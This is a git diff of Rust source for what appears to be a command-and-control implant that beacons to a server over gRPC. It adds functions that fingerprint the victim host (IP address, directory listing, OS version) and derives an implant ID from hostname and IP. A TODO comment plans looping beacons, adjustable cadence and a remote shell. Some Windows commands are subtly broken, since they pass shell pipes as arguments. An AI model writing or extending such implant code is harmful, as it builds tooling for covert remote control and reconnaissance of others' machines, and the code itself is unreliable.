@@ -10,17 +10,59 @@ use tonic::transport::Endpoint;
 // Some TODOs in no meaningful order
 /*
 Define what a command is, and get some cross platform definitions in place
-    - hostname
-    - whoami
-    - whats my ip
-    - whats my os
     - help
+    - change beacon cadence
     - drop into a shell 
 Make the beacons run in a loop
 Figure out the implementation of getting commands newer than last run
 Log actions on the server
 Have a real client do things
 */
+
+#[cfg(target_os = "linux")]
+fn get_ip_address() -> String {
+    let ip_address = Command::new("hostname")
+                            .arg("-I")
+                            .output()
+                            .unwrap();
+    let ip_address = String::from_utf8(ip_address.stdout).unwrap();
+    let ip_address = ip_address.trim();
+    ip_address.to_string()
+}
+
+#[cfg(windows)]
+fn get_ip_address() -> String {
+    let ip_address = Command::new("ipconfig")
+                            .arg("|")
+                            .arg("findstr")
+                            .arg("IPv4")
+                            .output()
+                            .unwrap();
+    let ip_address = String::from_utf8(ip_address.stdout).unwrap();
+    let ip_address: Vec<&str> = ip_address.split(":").collect();
+    let ip_address = ip_address[1].trim();
+    ip_address.to_string()
+}
+
+#[cfg(target_os = "linux")]
+fn get_directory_listing() -> String {
+    let directory = Command::new("ls")
+                            .output()
+                            .unwrap();
+    let directory = String::from_utf8(directory.stdout).unwrap();
+    let directory = directory.trim();
+    directory.to_string()
+}
+
+#[cfg(windows)]
+fn get_directory_listing() -> String {
+    let directory = Command::new("dir")
+                            .output()
+                            .unwrap();
+    let directory = String::from_utf8(directory.stdout).unwrap();
+    let directory = directory.trim();
+    directory.to_string()
+}
 
 fn calculate_hash<T: Hash>(t: &T) -> u64 {
     let mut s = DefaultHasher::new();
@@ -36,15 +78,34 @@ fn generate_implant_id() -> String {
     let hostname = hostname.trim();
 
     // This will work on Linux. Need to do "ipconfig | findstr IPv4" or something similar on Windows
-    let ip_address = Command::new("hostname")
-                            .arg("-I")
-                            .output()
-                            .unwrap();
-    let ip_address = String::from_utf8(ip_address.stdout).unwrap();
-    let ip_address = ip_address.trim();
+    let ip_address = get_ip_address();
 
     let hashed_value = calculate_hash(&format!("{hostname}:{ip_address}"));
     format!("{hashed_value:x}")
+}
+
+#[cfg(target_os = "linux")]
+fn get_operating_system() -> String {
+    let os = Command::new("cat")
+                    .arg("/proc/version")
+                    .output()
+                    .unwrap();
+    let os = String::from_utf8(os.stdout).unwrap();
+    let os = os.trim();
+    os.to_string()
+}
+
+#[cfg(windows)]
+fn get_operating_system() -> String {
+    let os = Command::new("systeminfo")
+                    .arg("|")
+                    .arg("findstr")
+                    .arg("OS ")
+                    .output()
+                    .unwrap();
+    let os = String::from_utf8(os.stdout).unwrap();
+    let os = os.trim();
+    os.to_string()
 }
 
 #[tokio::main]
